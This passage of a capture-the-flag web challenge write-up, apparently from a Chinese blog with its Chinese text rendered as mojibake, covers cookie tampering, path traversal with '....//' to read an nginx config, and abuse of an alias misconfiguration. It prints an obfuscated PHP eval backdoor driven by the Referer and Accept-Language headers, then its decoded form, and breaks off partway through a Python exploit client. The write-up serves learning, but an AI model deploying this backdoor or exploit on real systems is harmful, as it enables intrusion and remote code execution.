class="hljs-regexp">/sites-enabled/</span>site.conf</code></pre><p>è¿˜æœ‰è¿™å‡ ä¸ª</p><p><img src="https://i.loli.net/2020/12/09/iDh1arKt2lNRfxk.png" alt="image-20201209100341300"></p><p>æŠ“åŒ…å‘ç°cookieï¼Œå°†å…¶æ”¹ä¸º1åå‘ç°å°±å¯ä»¥ç™»å½•äº†ï¼Œè¿™é‡Œæ˜¯ä½¿ç”¨æµè§ˆå™¨çš„cookieç¼–è¾‘æ’ä»¶</p><p><img src="https://i.loli.net/2020/12/09/fk6YVQZIFruy8ov.png" alt="image-20201209095233466"></p><p>ç™»å½•åçš„url</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">220.249</span>.<span class="hljs-number">52.133</span>:<span class="hljs-number">35234</span><span class="hljs-regexp">/admin/</span>admin.php?file=index&amp;ext=php</code></pre><h2 id="0x2è¯»å–é…ç½®æ–‡ä»¶"><a href="#0x2è¯»å–é…ç½®æ–‡ä»¶" class="headerlink" title="0x2è¯»å–é…ç½®æ–‡ä»¶"></a>0x2è¯»å–é…ç½®æ–‡ä»¶</h2><p>å°è¯•è¯»å–index.phpå’Œadmin.phpæºç éƒ½å¤±è´¥äº†ï¼Œå†è¯•è¯•robots.txtä¸­çš„é¡µé¢</p><p>ç›´æ¥è¾“å…¥è·¯å¾„ä¼šè·³è½¬åˆ°ä¸»é¡µä¸æ˜¾ç¤ºå†…å®¹ï¼Œå¯èƒ½å­˜åœ¨è¿‡æ»¤å¯¼è‡´æ–‡ä»¶è·¯å¾„æ— æ•ˆ</p><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc<span class="hljs-regexp">/nginx/</span>sites-enabled/site.conf&amp;ext=</code></pre><p>ç”¨åŒå†™ç»•è¿‡</p><pre><code class="hljs awk">?file=....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>etc<span class="hljs-regexp">/nginx/</span>sites-enabled/site.conf&amp;ext=</code></pre><p>æ‹¿åˆ°äº†é…ç½®æ–‡ä»¶</p><pre><code class="hljs stata">server &#123;    listen 8080; ## listen <span class="hljs-keyword">for</span> ipv4; this <span class="hljs-keyword">line</span> is default and implied    listen [::]:8080; ## listen <span class="hljs-keyword">for</span> ipv6    root /<span class="hljs-keyword">var</span>/www/html;    index index.php index.html index.htm;    port_in_redirect off;    server_name _;    # Make site accessible from http:<span class="hljs-comment">//localhost/</span>    #server_name localhost;    # <span class="hljs-keyword">If</span> block <span class="hljs-keyword">for</span> setting the time <span class="hljs-keyword">for</span> the logfile    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$time_iso8601</span> ~ <span class="hljs-string">&quot;^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)&quot;</span>) &#123;       <span class="hljs-keyword">set</span> <span class="hljs-variable">$year</span> <span class="hljs-variable">$1</span>;       <span class="hljs-keyword">set</span> <span class="hljs-variable">$month</span> <span class="hljs-variable">$2</span>;       <span class="hljs-keyword">set</span> <span class="hljs-variable">$day</span> <span class="hljs-variable">$3</span>;    &#125;    # Disable sendfile <span class="hljs-keyword">as</span> per https:<span class="hljs-comment">//docs.vagrantup.com/v2/synced-folders/virtualbox.html</span>    sendfile off;        <span class="hljs-keyword">set</span> <span class="hljs-variable">$http_x_forwarded_for_filt</span> <span class="hljs-variable">$http_x_forwarded_for</span>;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_x_forwarded_for_filt</span> ~ ([0-9]+\.[0-9]+\.[0-9]+\.)[0-9]+) &#123;                <span class="hljs-keyword">set</span> <span class="hljs-variable">$http_x_forwarded_for_filt</span> <span class="hljs-variable">$1</span>???;        &#125;    # Add stdout logging    access_log /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/nginx/<span class="hljs-variable">$hostname</span>-access-<span class="hljs-variable">$year</span>-<span class="hljs-variable">$month</span>-<span class="hljs-variable">$day</span>.<span class="hljs-keyword">log</span> openshift_log;    error_log /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/nginx/<span class="hljs-keyword">error</span>.<span class="hljs-keyword">log</span> info;    location / &#123;        # First attempt to serve request <span class="hljs-keyword">as</span> <span class="hljs-keyword">file</span>, then        # <span class="hljs-keyword">as</span> directory, then fall back to index.html        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.php?q=<span class="hljs-variable">$uri</span>&amp;<span class="hljs-variable">$args</span>;        server_tokens off;    &#125;    #error_page 404 /404.html;    # redirect server <span class="hljs-keyword">error</span> pages to the static page /50x.html    #    error_page 500 502 503 504 /50x.html;    location = /50x.html &#123;        root /usr/share/nginx/html;    &#125;    location ~ \.php$ &#123;        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.php?q=<span class="hljs-variable">$uri</span>&amp;<span class="hljs-variable">$args</span>;        fastcgi_split_path_info ^(.+\.php)(/.+)$;        fastcgi_pass unix:/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/php/php5.6-fpm.sock;        fastcgi_param SCRIPT_FILENAME <span class="hljs-variable">$document_root</span><span class="hljs-variable">$fastcgi_script_name</span>;        fastcgi_param SCRIPT_NAME <span class="hljs-variable">$fastcgi_script_name</span>;        fastcgi_index index.php;        <span class="hljs-keyword">include</span> fastcgi_params;        fastcgi_param REMOTE_ADDR <span class="hljs-variable">$http_x_forwarded_for</span>;    &#125;    location ~ /\. &#123;            log_not_found off;            deny all;    &#125;    location /web-img &#123;  <span class="hljs-comment">//è¿™é‡Œå­˜åœ¨é—®é¢˜</span>          alias /images/;        autoindex <span class="hljs-keyword">on</span>;    &#125;    location ~* \.(ini|docx|pcapng|doc)$ &#123;           deny all;      &#125;      <span class="hljs-keyword">include</span> /<span class="hljs-keyword">var</span>/www/nginx[.]<span class="hljs-keyword">conf</span>;</code></pre><p>è¿™ä¸ªæ–‡ä»¶å†…å®¹ä¹Ÿçœ‹ä¸æ‡‚ï¼Œä½†æ˜¯çŸ¥é“è¿™é‡Œå­˜åœ¨é—®é¢˜</p><pre><code class="hljs nginx"><span class="hljs-attribute">location</span> /web-img &#123;     <span class="hljs-attribute">alias</span> /images/;    <span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;&#125;</code></pre><p><strong>alias</strong>,å°±æ˜¯ç»™ /web-imgï¼Œè®¾ç½®äº†ä¸€ä¸ªåˆ«åï¼Œå½“è®¿é—®/web-imgå°±ç›¸å½“äºè®¿é—®äº† /images/</p><pre><code class="hljs awk">location ^~ <span class="hljs-regexp">/t/</span> &#123; alias <span class="hljs-regexp">/www/</span>root<span class="hljs-regexp">/html/</span>new_t/;&#125;</code></pre><p>å¦‚æœä¸€ä¸ªè¯·æ±‚çš„URIæ˜¯/t/a.htmlæ—¶ï¼ŒwebæœåŠ¡å™¨å°†ä¼šè¿”å›æœåŠ¡å™¨ä¸Šçš„/www/root/html/new_t/a.htmlçš„æ–‡ä»¶ã€‚æ³¨æ„è¿™é‡Œæ˜¯new_tï¼Œå› ä¸ºaliasä¼šæŠŠlocationåé¢é…ç½®çš„è·¯å¾„ä¸¢å¼ƒæ‰ï¼ŒæŠŠå½“å‰åŒ¹é…åˆ°çš„ç›®å½•æŒ‡å‘åˆ°æŒ‡å®šçš„ç›®å½•ã€‚</p><p><strong>autoindex</strong> </p><p>Nginxé»˜è®¤æ˜¯ä¸å…è®¸åˆ—å‡ºæ•´ä¸ªç›®å½•çš„ã€‚å¦‚éœ€æ­¤åŠŸèƒ½ï¼Œæ‰“å¼€nginx.confæ–‡ä»¶æˆ–ä½ è¦å¯ç”¨ç›®å½•æµè§ˆè™šæ‹Ÿä¸»æœºçš„é…ç½®æ–‡ä»¶ï¼Œåœ¨serveræˆ–location æ®µé‡Œæ·»åŠ ä¸Šautoindex on</p><p>è¿™é‡Œå°†å…¶æ‰“å¼€å°±ä¼šå¯¼è‡´æˆ‘ä»¬å¯ä»¥è®¿é—®æ ¹ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶å¤¹</p><p>url</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">220.249</span>.<span class="hljs-number">52.133</span>:<span class="hljs-number">35234</span><span class="hljs-regexp">/web-img../</span><span class="hljs-regexp">//</span>    web-img..<span class="hljs-regexp">/  == /im</span>age<span class="hljs-regexp">/../</span> ç›¸å½“äºå›é€€åˆ°äº†æ ¹ç›®å½•</code></pre><h3 id="0x3å‘ç°æ¼æ´"><a href="#0x3å‘ç°æ¼æ´" class="headerlink" title="0x3å‘ç°æ¼æ´"></a>0x3å‘ç°æ¼æ´</h3><p>åœ¨/var/www/ä¸­å‘ç°äº†ä¸€ä¸ªhack..php.bakï¼Œæ­£å¥½æ˜¯robots.txtä¸­æç¤ºçš„å†…å®¹</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$U</span>=<span class="hljs-string">&#x27;_/|U&quot;,&quot;/-/|U&quot;),ar|Uray|U(&quot;/|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle&#x27;</span>;<span class="hljs-variable">$q</span>=<span class="hljs-string">&#x27;s[|U$i]=&quot;&quot;;$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui&#x27;</span>;<span class="hljs-variable">$M</span>=<span class="hljs-string">&#x27;l=&quot;strtolower|U&quot;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$&#x27;</span>;<span class="hljs-variable">$z</span>=<span class="hljs-string">&#x27;r=@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua=@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r&#x27;</span>;<span class="hljs-variable">$k</span>=<span class="hljs-string">&#x27;?:;q=0.([\\|Ud]))?,|U?/&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&quot;|Usubst|Ur&quot;;|U|U$s&#x27;</span>;<span class="hljs-variable">$o</span>=<span class="hljs-string">&#x27;|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r&#x27;</span>;<span class="hljs-variable">$N</span>=<span class="hljs-string">&#x27;|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;/&#x27;</span>;<span class="hljs-variable">$C</span>=<span class="hljs-string">&#x27;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;/$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;&#x27;</span>;<span class="hljs-variable">$j</span>=<span class="hljs-string">&#x27;$k|Uh=&quot;|U|U42f7&quot;;$kf=&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&quot;&quot;;fo|Ur($i=0;$i&lt;&#x27;</span>;<span class="hljs-variable">$R</span>=str_replace(<span class="hljs-string">&#x27;rO&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;rOcreatrOe_rOrOfurOncrOtion&#x27;</span>);<span class="hljs-variable">$J</span>=<span class="hljs-string">&#x27;kf|U),|U0,3));$p=&quot;|U&quot;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$&#x27;</span>;<span class="hljs-variable">$x</span>=<span class="hljs-string">&#x27;r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;/([\\|U|Uw])[|U\\w-]+|U(&#x27;</span>;<span class="hljs-variable">$f</span>=str_replace(<span class="hljs-string">&#x27;|U&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$j</span>.<span class="hljs-variable">$o</span>.<span class="hljs-variable">$z</span>.<span class="hljs-variable">$x</span>.<span class="hljs-variable">$k</span>.<span class="hljs-variable">$M</span>.<span class="hljs-variable">$J</span>.<span class="hljs-variable">$q</span>.<span class="hljs-variable">$N</span>.<span class="hljs-variable">$U</span>.<span class="hljs-variable">$C</span>);<span class="hljs-variable">$g</span>=create_function(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$f</span>);<span class="hljs-variable">$g</span>();<span class="hljs-meta">?&gt;</span></code></pre><p>åˆæ˜¯ä¸€æ®µå¥‡å¥‡æ€ªæ€ªçš„ä»£ç </p><p>ä½†æ˜¯èƒ½çœ‹æ‡‚æœ€åä¸‰è¡Œæ˜¯ç”Ÿæˆäº†ä¸€ä¸ª$gå‡½æ•°ï¼Œè€Œä¸”æ˜¯ç”±$fç”Ÿæˆçš„ï¼Œé‚£ä¹ˆä¹…å°†$fæ‰“å°å‡ºæ¥çœ‹çœ‹ï¼Œåœ¨çº¿æ ¼å¼åŒ–åå¦‚ä¸‹</p><p>æ˜¯ä¸€ä¸ªåé—¨ç¨‹åºï¼Œä½†æ˜¯å¦‚ä½•åˆ©ç”¨æ˜¯ä¸ªé—®é¢˜ï¼Œå®åœ¨å¤ªèœäº†ï¼Œéƒ½çœ‹ä¸æ‡‚å†™çš„æ˜¯ä»€ä¹ˆï¼Œåªå¥½æ‰¾åˆ°wp</p><pre><code class="hljs php"><span class="hljs-variable">$kh</span>=<span class="hljs-string">&quot;42f7&quot;</span>;<span class="hljs-variable">$kf</span>=<span class="hljs-string">&quot;e9ac&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>,<span class="hljs-variable">$k</span></span>) </span>&#123;<span class="hljs-variable">$c</span>=strlen(<span class="hljs-variable">$k</span>);<span class="hljs-variable">$l</span>=strlen(<span class="hljs-variable">$t</span>);<span class="hljs-variable">$o</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$l</span>;) &#123;<span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;(<span class="hljs-variable">$j</span>&lt;<span class="hljs-variable">$c</span>&amp;&amp;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$l</span>);<span class="hljs-variable">$j</span>++,<span class="hljs-variable">$i</span>++) &#123;<span class="hljs-variable">$o</span>.=<span class="hljs-variable">$t</span> &#123;<span class="hljs-variable">$i</span>&#125;^<span class="hljs-variable">$k</span> &#123;<span class="hljs-variable">$j</span>&#125;;&#125;&#125;<span class="hljs-keyword">return</span> <span class="hljs-variable">$o</span>;&#125;<span class="hljs-variable">$r</span>=<span class="hljs-variable">$_SERVER</span>;<span class="hljs-variable">$rr</span>=@<span class="hljs-variable">$r</span>[<span class="hljs-string">&quot;HTTP_REFERER&quot;</span>];<span class="hljs-variable">$ra</span>=@<span class="hljs-variable">$r</span>[<span class="hljs-string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-variable">$rr</span>&amp;&amp;<span class="hljs-variable">$ra</span>) &#123;<span class="hljs-variable">$u</span>=parse_url(<span class="hljs-variable">$rr</span>);parse_str(<span class="hljs-variable">$u</span>[<span class="hljs-string">&quot;query&quot;</span>],<span class="hljs-variable">$q</span>);<span class="hljs-variable">$q</span>=array_values(<span class="hljs-variable">$q</span>);preg_match_all(<span class="hljs-string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,<span class="hljs-variable">$ra</span>,<span class="hljs-variable">$m</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$q</span>&amp;&amp;<span class="hljs-variable">$m</span>) &#123;@session_start();<span class="hljs-variable">$s</span>=&amp;<span class="hljs-variable">$_SESSION</span>;<span class="hljs-variable">$ss</span>=<span class="hljs-string">&quot;substr&quot;</span>;<span class="hljs-variable">$sl</span>=<span class="hljs-string">&quot;strtolower&quot;</span>;<span class="hljs-variable">$i</span>=<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>].<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<span class="hljs-variable">$h</span>=<span class="hljs-variable">$sl</span>(<span class="hljs-variable">$ss</span>(md5(<span class="hljs-variable">$i</span>.<span class="hljs-variable">$kh</span>),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>));<span class="hljs-variable">$f</span>=<span class="hljs-variable">$sl</span>(<span class="hljs-variable">$ss</span>(md5(<span class="hljs-variable">$i</span>.<span class="hljs-variable">$kf</span>),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>));<span class="hljs-variable">$p</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">for</span> (<span class="hljs-variable">$z</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$z</span>&lt;count(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>]);<span class="hljs-variable">$z</span>++)<span class="hljs-variable">$p</span>.=<span class="hljs-variable">$q</span>[<span class="hljs-variable">$m</span>[<span class="hljs-number">2</span>][<span class="hljs-variable">$z</span>]];<span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$p</span>,<span class="hljs-variable">$h</span>)===<span class="hljs-number">0</span>) &#123;<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$p</span>=<span class="hljs-variable">$ss</span>(<span class="hljs-variable">$p</span>,<span class="hljs-number">3</span>);&#125;<span class="hljs-keyword">if</span>(array_key_exists(<span class="hljs-variable">$i</span>,<span class="hljs-variable">$s</span>)) &#123;<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>].=<span class="hljs-variable">$p</span>;<span class="hljs-variable">$e</span>=strpos(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>],<span class="hljs-variable">$f</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$e</span>) &#123;<span class="hljs-variable">$k</span>=<span class="hljs-variable">$kh</span>.<span class="hljs-variable">$kf</span>;ob_start();@<span class="hljs-keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/_/&quot;</span>,<span class="hljs-string">&quot;/-/&quot;</span>),<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>),<span class="hljs-variable">$ss</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>],<span class="hljs-number">0</span>,<span class="hljs-variable">$e</span>))),<span class="hljs-variable">$k</span>)));<span class="hljs-variable">$o</span>=ob_get_contents();ob_end_clean();<span class="hljs-variable">$d</span>=base64_encode(x(gzcompress(<span class="hljs-variable">$o</span>),<span class="hljs-variable">$k</span>));<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;<span class="hljs-subst">$k</span>&gt;<span class="hljs-subst">$d</span>&lt;/<span class="hljs-subst">$k</span>&gt;&quot;</span>);@session_destroy();&#125;&#125;&#125;&#125;</code></pre><p>åšä¸ªåˆ†æ</p><ul><li>å…ˆæ˜¯é¢„å®šä¹‰é˜¶æ®µ , å®šä¹‰äº†ä¸¤ä¸ªå­—ç¬¦ä¸²å’Œä¸€ä¸ª <code>x()</code> å‡½æ•°</li><li>ç„¶åè·å–æ”»å‡»è€…å‘é€çš„æ•°æ® , è¿™é‡Œæ”»å‡»ä»£ç æ˜¯é€šè¿‡ Referer å­—æ®µä¼ è¾“çš„</li><li>æ³¨æ„æ­£åˆ™å‡½æ•° preg_match_all() , è¯¥å‡½æ•°ä» <a href="https://blog.csdn.net/qq_40491569/article/details/83472556">Accept-Language</a> å–å€¼ , ç„¶åé€šè¿‡æ­£åˆ™åŒ¹é…åè¾“å‡ºåˆ° <code>$m</code> æ•°ç»„ä¸­</li><li>ç„¶åæ‹¼æ¥äº†å‰ä¸¤ç§å¯é€‰è¯­è¨€çš„é¦–å­—æ¯ , å’Œé¢„å®šä¹‰çš„å­—ç¬¦ä¸²æ‹¼æ¥å¹¶è¿›è¡Œ md5 æ ¡éªŒ , æˆªå–ç­‰æ“ä½œ . ç„¶åèµ‹å€¼ç»™ <code>$h</code> å’Œ <code>$f</code> ä¸¤ä¸ªå˜é‡</li><li>å¾ªç¯ä¸­çš„ <code>$p .= $q[$m[2][$z]]</code> ä¼šä¸æ–­ä» <code>$q</code> ä¸­æå–æ•°æ® . ç»“åˆä¹‹å‰çš„ä»£ç  , æ”»å‡»ä»£ç æ˜¯æ”¾åœ¨ Referer ä¸­çš„( æœ€åä¼šæ”¾åœ¨ <code>$q</code> ä¸­ ) , å› æ­¤è¿™é‡Œå¯ä»¥çœ‹ä½œæ˜¯æ‹¼æ¥æ”»å‡»ä»£ç  , ç»„åˆæˆ Payload .</li><li>ç„¶ååˆ¤æ–­ <code>$h</code> æ˜¯å¦å‡ºç°åœ¨ Payload çš„å¼€å¤´ , è‹¥æ˜¯åˆ™è®¾ç½® <code>$_SESSION[&#39;$i&#39;] = &quot;&quot;</code> , åŒæ—¶åˆ é™¤ Payload çš„ $h éƒ¨åˆ† .</li><li>æ¥ç€åˆ¤æ–­ <code>$_SESSION</code> ä¸­é‚£ä¸ªæ˜¯å¦å­˜åœ¨ <code>$i</code> è¿™ä¸ªé”®å , è‹¥æ˜¯åˆ™å°† Payload èµ‹å€¼ç»™ <code>$_SESSION[$i]</code> , ç„¶åæŸ¥æ‰¾ <code>$_SESSION[$i]</code>( ä¹Ÿå°±æ˜¯ Payload ) ä¸­ <code>$f</code> ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½® .</li><li>æœ€åæ‰§è¡Œpayload</li></ul><p>expï¼š</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint,choice<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<span class="hljs-keyword">import</span> urllib<span class="hljs-keyword">import</span> string<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> re<span class="hljs-comment"># ç”¨äºç”Ÿæˆå®Œæ•´çš„ Accept-Language</span><span class="hljs-keyword">from</span> urllib3.connectionpool <span class="hljs-keyword">import</span> xrange<span class="hljs-keyword">from</span> yapf.yapflib.py3compat <span class="hljs-keyword">import</span> raw_input<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choicePart</span>(<span class="hljs-params">seq,amount</span>):</span>    length = <span class="hljs-built_in">len</span>(seq)    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> length &lt; amount:        print(<span class="hljs-string">&#x27;Error Input&#x27;</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>    result = []    <span class="hljs-comment"># ç»“æœ</span>    indexes = []    <span class="hljs-comment"># ç´¢å¼•</span>    count = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> count &lt; amount:        i = randint(<span class="hljs-number">0</span>,length-<span class="hljs-number">1</span>)        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> i <span class="hljs-keyword">in</span> indexes:            indexes.append(i)            result.append(seq[i])            count += <span class="hljs-number">1</span>            <span class="hljs-keyword">if</span> count == amount:                <span class="hljs-keyword">return</span> result<span class="hljs-comment"># ç”Ÿæˆéšæœºå¡«å……å­—ç¬¦ä¸²( ç”±æ‰€æœ‰ ASCII å­—ç¬¦ç»„æˆ , åŒ…æ‹¬ä¸å¯è¯»çš„å­—ç¬¦ )</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randBytesFlow</span>(<span class="hljs-params">amount</span>):</span>    result = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(amount):        result += <span class="hljs-built_in">chr</span>(randint(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>))    <span class="hljs-keyword">return</span>  result<span class="hljs-comment"># ç”Ÿæˆéšæœºå¡«å……å­—ç¬¦ä¸²( ç”±æ‰€æœ‰å¤§å°å†™å­—æ¯ç»„æˆ )</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randAlpha</span>(<span class="hljs-params">amount</span>):</span>    result = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(amount):        <span class="hljs-comment"># choice() æ–¹æ³•è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œå…ƒç»„æˆ–å­—ç¬¦ä¸²çš„éšæœºé¡¹</span>        <span class="hljs-comment"># string.ascii_letters ä¼šç”Ÿæˆæ‰€æœ‰çš„å­—æ¯</span>        result += choice(string.ascii_letters)    <span class="hljs-keyword">return</span> result<span class="hljs-comment"># æ¨¡æ‹Ÿ x() å‡½æ•° , å¾ªç¯å¼‚æˆ–åŠ å¯†</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loopXor</span>(<span class="hljs-params">text,key</span>):</span>    result = <span class="hljs-string">&#x27;&#x27;</span>    lenKey = <span class="hljs-built_in">len</span>(key)    lenTxt = <span class="hljs-built_in">len</span>(text)    iTxt = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> iTxt &lt; lenTxt:        iKey = <span class="hljs-number">0</span>        <span class="hljs-keyword">while</span> iTxt&lt;lenTxt <span class="hljs-keyword">and</span> iKey&lt;lenKey:            result += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(key[iKey]) ^ <span class="hljs-built_in">ord</span>(text[iTxt]))            iTxt += <span class="hljs-number">1</span>            iKey += <span class="hljs-number">1</span>    <span class="hljs-keyword">return</span> result<span class="hljs-comment"># å¼€å¯ Debug é€‰é¡¹</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debugPrint</span>(<span class="hljs-params">msg</span>):</span>    <span class="hljs-keyword">if</span> debugging:        <span class="hljs-built_in">print</span> (msg)<span class="hljs-comment"># å®šä¹‰åŸºæœ¬å˜é‡</span>debugging = <span class="hljs-literal">False</span>    <span class="hljs-comment"># é»˜è®¤å…³é—­ Debug , å¯ç”¨ True å¼€å¯</span>keyh = <span class="hljs-string">&quot;42f7&quot;</span>    <span class="hljs-comment"># $kh , éœ€è¦ä¿®æ”¹</span>keyf = <span class="hljs-string">&quot;e9ac&quot;</span>    <span class="hljs-comment"># $kf , éœ€è¦ä¿®æ”¹</span>xorKey = keyh + keyf    <span class="hljs-comment"># $k</span>url = <span class="hljs-string">&#x27;http://111.198.29.45:47960/hack.php&#x27;</span>    <span class="hljs-comment"># æŒ‡å®š URL  , éœ€è¦ä¿®æ”¹</span>defaultLang = <span class="hljs-string">&#x27;zh-CN&#x27;</span>    <span class="hljs-comment">#é»˜è®¤Language</span>languages = [<span class="hljs-string">&#x27;zh-TW;q=0.%d&#x27;</span>,<span class="hljs-string">&#x27;zh-HK;q=0.%d&#x27;</span>,<span class="hljs-string">&#x27;en-US;q=0.%d&#x27;</span>,<span class="hljs-string">&#x27;en;q=0.%d&#x27;</span>]    <span class="hljs-comment">#Accept-Language æ¨¡æ¿</span>proxies = <span class="hljs-literal">None</span>    <span class="hljs-comment"># &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; # ä»£ç† , å¯ç”¨äº BurpSuite ç­‰</span>sess = requests.Session()    <span class="hljs-comment"># åˆ›å»ºä¸€ä¸ª SESSION å¯¹è±¡</span><span class="hljs-comment"># æ¯æ¬¡ä¼šè¯ä¼šäº§ç”Ÿä¸€æ¬¡éšæœºçš„ Accept-Language</span>langTmp = choicePart(languages,<span class="hljs-number">3</span>)    <span class="hljs-comment"># è¾“å‡ºä¸€ä¸ªåˆ—è¡¨ , åŒ…å«æ¨¡æ¿ä¸­çš„ä¸‰ç§ Accept-language</span>indexes = <span class="hljs-built_in">sorted</span>(choicePart(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>),<span class="hljs-number">3</span>), reverse=<span class="hljs-literal">True</span>)    <span class="hljs-comment"># é™åºæ’åºè¾“å‡ºä¸‰ä¸ªæƒé‡å€¼ , ä¾‹å¦‚ [8,6,4]</span>acceptLang = [defaultLang]   <span class="hljs-comment"># å…ˆæ·»åŠ é»˜è®¤Language</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">3</span>):    acceptLang.append(langTmp[i] % (indexes[i],))    <span class="hljs-comment"># ç„¶åå¾ªç¯æ·»åŠ ä¸‰ç§ Accept-Language , 